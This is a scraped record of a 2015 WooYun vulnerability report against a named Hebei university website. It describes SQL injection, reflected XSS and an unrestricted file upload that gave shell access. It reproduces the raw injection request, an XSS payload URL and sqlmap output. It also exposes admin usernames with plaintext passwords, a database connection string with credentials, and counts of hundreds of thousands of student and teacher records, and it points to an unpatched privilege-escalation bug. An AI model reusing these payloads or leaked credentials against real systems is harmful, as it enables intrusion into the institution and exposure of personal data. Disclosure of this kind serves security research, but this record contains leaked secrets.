{"id": 28789, "wybug_id": "wooyun-2015-0121290", "wybug_title": "河北某大学SQL注入+XSS(已入后台Shell)", "wybug_corp": "CCERT教育网应急响应组", "wybug_author": "路人甲", "wybug_date": "2015-06-18 16:29", "wybug_open_date": "2015-06-23 16:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["上传", "注入", "数据泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 注入XSS（反射存储）上传泄漏大量教师、学生、四六级等个人信息几十万数据库信息 详细说明：  0x01 SQL注入漏洞POST 注入，在这个漏洞上就能把数量统计出来啦\nPOST /jpk/loginyanzheng.aspx HTTP/1.1Content-Length: 217Content-Type: application/x-www-form-urlencodedCookie: ASPSESSIONIDAAADQARS=FDEBKICDDLBKGHMGNDAMANDG; ASP.NET_SessionId=g502e555fed4jo555ldmrgyf; cookiesname=fbscjygaHost: jpk.heuet.edu.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*submit=%e7%99%bb%20%20%e5%bd%95&p=a&u=1\nsqlmap 截图\n\n\navailable databases [10]:[*] DGSX[*] English[*] JWC[*] master[*] model[*] msdb[*] Teacher[*] tempdb[*] yishu[*] zcyl\n几个密码表\nDatabase: EnglishTable: admin[7 entries]+----+-------+-------+--------+----------+-----------+| id | popem | state | module | password | adminname |+----+-------+-------+--------+----------+-----------+| 1  | 1     | 1     | 超级管理   | 123456   | admin     || 6  | 0     | 1     | 交流园地   | 123456   | chat      || 5  | 0     | 1     | 考试指南   | 123456   | exam      || 7  | 0     | 1     | 相关链接   | 123456   | link      || 4  | 0     | 1     | 写作自测   | 123456   | test      || 3  | 0     | 1     | 理论技巧   | 123456   | theory    || 2  | 0     | 1     | 写作资源   | 123456   | write     |+----+-------+-------+--------+----------+-----------+Database: JWCTable: admin[17 entries]+----+--------------+-------+----------+----------+| id | smallclassid | popem | username | password |+----+--------------+-------+----------+----------+| 10 | 9            | 0     | sysgl    | 87656716 || 10 | 9            | 0     | sysgl    | 87656716 || 11 | 3            | 0     | szk      | 87655665 || 12 | 6            | 0     | xsk      | 87655613 || 13 | 7            | 0     | xxzx     | 87655970 || 2  | 11           | 0     | gjyjs    | 7326042  || 33 | 5            | 0     | jck      | 87655842 || 43 | 10           | 0     | dmtjsgl  | 87326025 || 43 | 10           | 0     | dmtjsgl  | 87326025 || 46 | 22           | 0     | jxszlt   | jxszlt   || 47 | 24           | 0     | bgxz     | 87655654 || 48 | 25           | 0     | syzx     | 87656338 || 5  | 18           | 0     | jsglk    | 87326025 || 6  | 1            | 0     | jwcbgs   | 87655649 || 7  | 2            | 0     | jwk      | 87655654 || 8  | 8            | 0     | jxjck    | 87655875 || 9  | 4            | 0     | jxk      | 737678   |+----+--------------+-------+----------+----------+\n统计下，目前连接的裤子有多少条记录艺术类几十万\nDatabase: yishu+--------------------------------------------------+---------+| Table                                            | Entries |+--------------------------------------------------+---------+| dbo.KSBMK                                        | 284090  || dbo.KSYSK                                        | 60761   || dbo.YXMCK                                        | 2428    || dbo.YXZYK                                        | 1776    || dbo.xuexiaozy                                    | 74      || dbo.CJK                                          | 29      |+--------------------------------------------------+---------+\n教师的数据有几万\nDatabase: Teacher+--------------------------------------------------+---------+| Table                                            | Entries |+--------------------------------------------------+---------+| dbo.T教学                                            | 27863   || dbo.V教学                                            | 27863   || dbo.SZJX                                         | 7450    || dbo.T帐号                                            | 1189    || dbo.V帐号                                            | 1101    || dbo.szjb                                         | 1097    || dbo.T教师                                            | 1060    || dbo.V教师                                            | 1060    || dbo.TRP教学学年                                          | 477     || dbo.VRP教学学年                                          | 477     || dbo.TRP教学自然年                                          | 295     || dbo.VRP教学自然年                                          | 295     || dbo.T进修                                            | 100     || dbo.V进修                                            | 100     || dbo.T院部                                            | 99      || dbo.V院部                                            | 99      || dbo.T教师调出                                            | 52      || dbo.V教师调出                                            | 52      || dbo.T配置                                            | 47      || dbo.T教师退休                                            | 36      || dbo.V教师退休                                            | 36      || dbo.T汇总                                            | 6       || dbo.V汇总通表                                            | 6       || dbo.T权限                                            | 5       |+--------------------------------------------------+---------+\n0x02 XSShttp://jpk.heuet.edu.cn/nmh/yymj.asp?categoryID=1'%22()%26%25<woo><ScRiPt%20>alert(1)</ScRiPt>&page=2\n\n0x03 上传漏洞\nhttp://jpk.heuet.edu.cn/jpk/gxxz/lb_upload.aspx\n以游客身份登录即可\n\n没有任何限制，上传ASPX asp PHP 都能解析，\n\n\nhttp://jpk.heuet.edu.cn/jpk/gxxz/lb_selectFile.aspx\n\n\n\n\n里面的信息随便下载审核即可，当然也可以提权MS11-046这个补丁没有打，可以创建高管。请自行删除。敏感数据\n<connectionStrings>    <add name=\"constr\" connectionString=\"Data Source=JWC\\SQLEXPRESS;database=zcyl;Integrated Security=SSPI;uid=wangjunchao;password=wangjunchao12302;Connect Timeout=30;\"/>    <add name=\"OA_DBConnectionString\" connectionString=\"Data Source=JWC\\SQLEXPRESS;database=zcyl;Integrated Security=SSPI;uid=wangjunchao;password=wangjunchao12302;\"/>    <add name=\"OA_DBConnectionString1\" connectionString=\"Data Source=JWC\\SQLEXPRESS;database=zcyl;Integrated Security=SSPI;uid=wangjunchao;password=wangjunchao12302;\"/>\n看一下server上面打包的数据库有哪些 113MB的数据库文件\n\n四六级的数据就多了，感觉数学都不好使啦，28.6MB的access 的数据库\n\nphoto里面的个人信息 一个表中也就五万条\n\n其他的mdf ldf 可以附加在SQL2005 记得权限哦teacher.mdf\n\nzcyl.mdf\n\n   漏洞证明：  \n\n\n\n   修复方案：  修改源代码防注入防上传   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-23 16:30 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-23 23:28 |    \t\tSoulmk \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 我是来学习滴~~)\t\t \n  相当6啊，不过记得打码么~~    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}